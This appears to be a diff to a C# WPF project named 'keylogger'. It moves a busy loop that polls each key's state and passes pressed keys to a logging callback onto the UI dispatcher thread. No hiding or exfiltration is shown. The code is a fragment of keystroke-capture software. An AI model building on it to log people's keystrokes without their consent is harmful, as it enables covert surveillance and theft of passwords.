@@ -2,6 +2,7 @@ using System;
 using System.Windows.Input;
 using System.Threading.Tasks;
 using System.Collections.Generic;
+using System.Windows.Threading;
 
 namespace keylogger
 {
@@ -24,7 +25,7 @@ namespace keylogger
             LoggerKeys = new List<Key>();
         }
 
-        public void Hook(Action<Key> LogKeys)
+        public void Hook(Action<Key> LogKeys, Dispatcher dispatcher)
         {
             if (Start)
                 return;
@@ -36,16 +37,19 @@ namespace keylogger
                     while (true)
                     {
                         foreach (var item in Keys)
-                        {
-                            if (Keyboard.IsKeyDown(item.Key) && item.Value == true)
+                        {                           
+                            dispatcher.Invoke(() =>
                             {
-                                LogKeys(item.Key);
-                                Keys[item.Key] = false;
-                            }
-                            if (Keyboard.IsKeyUp(item.Key))
-                            {
-                                Keys[item.Key] = true;
-                            }
+                                if (Keyboard.IsKeyDown(item.Key) && item.Value == true)
+                                {
+                                    LogKeys(item.Key);
+                                    Keys[item.Key] = false;
+                                }
+                                if (Keyboard.IsKeyUp(item.Key))
+                                {
+                                    Keys[item.Key] = true;
+                                }
+                            });
                         }
                     }
                 }
